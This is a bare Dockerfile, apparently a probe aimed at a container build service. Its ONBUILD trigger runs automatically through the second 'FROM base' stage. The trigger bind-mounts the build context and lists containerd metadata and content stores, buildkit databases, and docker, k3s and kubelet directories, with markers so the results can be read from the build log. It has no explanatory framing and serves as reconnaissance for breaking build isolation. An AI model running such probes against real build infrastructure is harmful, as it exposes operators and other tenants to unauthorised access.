FROM alpine:3.20 AS base
ONBUILD RUN --mount=type=bind,source=.,target=/v,ro sh -c 'set +e; echo --V--; ls -la /v 2>&1; echo --CONT--; ls -la /v/containerd 2>&1 | head -20; echo --CONT_BOLT--; ls -la /v/containerd/io.containerd.metadata.v1.bolt 2>&1 | head -20; echo --CONT_CS--; ls -la /v/containerd/io.containerd.content.v1.content 2>&1 | head -20; echo --BK--; ls -la /v/buildkit 2>&1 | head -40; echo --BK_DB--; find /v/buildkit -maxdepth 3 -name "*.db" -o -maxdepth 3 -name "metadata.db" 2>/dev/null | head -20; echo --BV--; ls -la /v/builderv3 2>&1 | head -40; echo --DOCKER--; ls -la /v/docker 2>&1 | head -10; echo --STACKER--; ls -la /v/stacker 2>&1 | head -10; echo --K3S--; ls -la /v/k3s 2>&1 | head -10; echo --KUBELET--; ls -la /v/kubelet 2>&1 | head -10; echo --END--'
FROM base
RUN true
CMD ["true"]
